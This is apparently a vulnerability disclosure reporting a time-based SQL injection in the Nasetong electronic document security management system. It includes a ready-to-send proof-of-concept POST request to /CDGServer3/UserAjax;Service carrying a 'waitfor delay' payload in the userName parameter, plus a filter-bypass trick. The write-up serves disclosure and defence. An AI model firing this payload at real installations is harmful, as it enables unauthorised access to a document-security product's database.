## Affected version: 
SQL injection exists in the Nasetong electronic document security management system

## Official website:
https://www.esafenet.com/xwzx/


## Vulnerability File:
/CDGServer3/UserAjax

## Description:
There is SQL injection in the Nasetong electronic document security management system, which can be bypassed by the filter to achieve delayed injection. The vulnerable parameter is userName.

Status: CRITICAL

## Vulnerability recurrence

/CDGServer3/UserAjax;Service

POC
```
POST /CDGServer3/UserAjax;Service HTTP/1.1
Host: 127.0.0.1:8888
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: JSESSIONID=2165527D28E701B8AB471584A11C40F8; JSESSIONID=C2320AC8D9656081FE8A3CF6A87DE53E
Upgrade-Insecure-Requests: 1
X-Forwarded-For: 192.168.12.3
Priority: u=0, i
Content-Type: application/x-www-form-urlencoded
Content-Length: 54

command=isExist&userName=123';waitfor delay '0:0:5'-- q
```
Prove the existence of injection through sqlmap
<img width="640" alt="image" src="https://github.com/user-attachments/assets/f6c8bac3-218c-499b-9f46-24395624dcfc" />

## code analysis:

In the findByProperty() method, SQL statement parameter splicing exists and is controllable
![CleanShot 2025-03-20 at 23 54 17@2x](https://github.com/user-attachments/assets/7ba8a8ab-1faf-48f7-b2e5-37995fd72615)



